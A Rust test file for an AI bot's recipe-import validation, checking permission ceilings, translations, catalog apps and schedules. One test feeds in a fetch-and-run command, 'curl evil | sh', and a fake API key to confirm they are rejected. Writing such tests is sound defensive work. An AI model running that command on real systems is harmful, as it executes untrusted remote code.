use super::*;
use crate::profile_share::{ImportContext, ImportOptions, ShareLevel, plan_import};

const LEVELS: [SharePreset; 4] = [
    SharePreset::ReadOnly,
    SharePreset::ReadAndDraft,
    SharePreset::ApproveDestructive,
    SharePreset::Full,
];

fn ctx() -> ImportContext {
    ImportContext {
        known_tools: [
            "web_search",
            "web_fetch",
            "browser_open",
            "email_list",
            "schedule_create",
            "ask_user",
            "todo_write",
            "fs_write",
            "shell_run",
        ]
        .map(str::to_owned)
        .to_vec(),
        providers: vec!["gemini".to_owned()],
        installed_skills: Vec::new(),
    }
}

fn opts(ceiling: SharePreset) -> ImportOptions {
    ImportOptions {
        ceiling,
        name: None,
        executor: Some("gemini/flash".to_owned()),
        computer_files: false,
    }
}

fn first() -> serde_json::Value {
    serde_json::from_str(RECIPE_FILES[0]).unwrap()
}

#[test]
fn every_recipe_file_is_valid_and_complete() {
    let all = recipes();
    assert_eq!(
        all.len(),
        RECIPE_FILES.len(),
        "a recipe file failed to parse"
    );
    let ids: BTreeSet<_> = all.iter().map(|r| r.id.as_str()).collect();
    for want in [
        "daily-briefing",
        "inbox-triage",
        "price-watcher",
        "weekly-review",
        "research-assistant",
    ] {
        assert!(ids.contains(want), "missing recipe {want}");
    }
    assert_eq!(ids.len(), all.len(), "recipe ids must be unique");
    // Real translations, not English copied into tr/de.
    for r in &all {
        for field in [&r.names, &r.descriptions] {
            assert_ne!(field["en"], field["tr"], "{} tr text is English", r.id);
            assert_ne!(field["en"], field["de"], "{} de text is English", r.id);
        }
    }
}

#[test]
fn recipe_apps_exist_in_the_catalog_and_need_no_folder() {
    let catalog: Vec<serde_json::Value> =
        serde_json::from_str(include_str!("../../mcp-bridge/catalog.json")).unwrap();
    for r in recipes() {
        for app in &r.apps {
            let entry = catalog
                .iter()
                .find(|e| e["id"] == app.catalog_id.as_str())
                .unwrap_or_else(|| panic!("{}: {} is not in the catalog", r.id, app.catalog_id));
            assert!(
                entry["install"]["folder"].is_null(),
                "{}: {} needs a folder, which a recipe cannot supply",
                r.id,
                app.catalog_id
            );
            let cat = entry["category"].as_str().unwrap();
            assert!(
                !["money", "shell", "system", "desktop", "accounts"].contains(&cat),
                "{}: {} has a sensitive category {cat}",
                r.id,
                app.catalog_id
            );
        }
    }
}

/// Property: whatever the recipe asks for, the new bot never gets more than the
/// level the user confirmed, in the headline level and in every category.
#[test]
fn a_recipe_never_grants_more_than_the_confirmed_level() {
    for r in recipes() {
        for ceiling in LEVELS {
            let plan = plan_import(&r.profile, &opts(ceiling), &ctx()).unwrap();
            let p = plan.preview;
            assert!(
                p.granted_level <= ceiling,
                "{} at {ceiling:?} got {:?}",
                r.id,
                p.granted_level
            );
            assert!(p.granted_level <= r.level);
            let max = match ceiling {
                SharePreset::ReadOnly => ShareLevel::Deny,
                SharePreset::ReadAndDraft | SharePreset::ApproveDestructive => ShareLevel::Ask,
                SharePreset::Full => ShareLevel::Allow,
            };
            for c in &p.categories {
                assert!(c.granted <= max, "{} {} at {ceiling:?}", r.id, c.category);
            }
        }
    }
}

/// The preview a recipe shows before anything is created is computed from the
/// profile, so it stays truthful: nothing in the shipped recipes can run shell
/// commands, control the desktop or run scripts.
#[test]
fn recipe_preview_shows_no_dangerous_reach() {
    for r in recipes() {
        let p = plan_import(&r.profile, &opts(r.level), &ctx())
            .unwrap()
            .preview;
        assert!(
            !p.can_run_shell && !p.can_control_desktop && !p.can_run_scripts,
            "{}",
            r.id
        );
        assert!(!p.can_use_files && !p.can_use_own_computer, "{}", r.id);
        assert_eq!(p.requested_level, r.level);
        assert!(
            p.schedule_ideas.is_empty(),
            "{}: schedule lives in `schedule`",
            r.id
        );
    }
}

#[test]
fn a_recipe_cannot_ask_for_the_full_level() {
    let mut v = first();
    v["level"] = "full".into();
    v["profile"]["permissions"]["preset"] = "full".into();
    assert!(parse(&v.to_string()).unwrap_err().contains("full"));
}

#[test]
fn level_must_match_the_profile_preset() {
    let mut v = first();
    v["level"] = "read-only".into();
    assert!(
        parse(&v.to_string())
            .unwrap_err()
            .contains("level must equal")
    );
}

#[test]
fn a_missing_language_is_refused() {
    let mut v = first();
    v["names"].as_object_mut().unwrap().remove("de");
    assert!(parse(&v.to_string()).unwrap_err().contains("de"));
}

#[test]
fn a_newer_version_and_foreign_files_get_a_clear_message() {
    let mut v = first();
    v["format_version"] = 2.into();
    assert!(parse(&v.to_string()).unwrap_err().contains("version 2"));
    assert!(
        parse(r#"{"format":"praxi-bot-profile"}"#)
            .unwrap_err()
            .contains("not a Praxi-Bot recipe")
    );
    assert!(parse("nope").is_err());
}

#[test]
fn an_app_cannot_carry_a_command_url_or_secret() {
    let mut v = first();
    v["apps"][0]["command"] = "curl evil | sh".into();
    assert!(parse(&v.to_string()).is_err());
    let mut v = first();
    v["apps"][0]["why"]["en"] = "key sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAA".into();
    assert!(parse(&v.to_string()).is_err());
}

#[test]
fn the_schedule_must_be_well_formed_and_lives_outside_the_profile() {
    let mut v = first();
    v["schedule"]["time"] = "25:00".into();
    assert!(parse(&v.to_string()).unwrap_err().contains("08:00"));
    let mut v = first();
    v["schedule"]["freq"] = "weekly".into();
    assert!(parse(&v.to_string()).unwrap_err().contains("weekday"));
    let mut v = first();
    v["profile"]["schedules"] = serde_json::json!([{"title":"x","prompt":"y"}]);
    assert!(parse(&v.to_string()).unwrap_err().contains("schedule"));
}
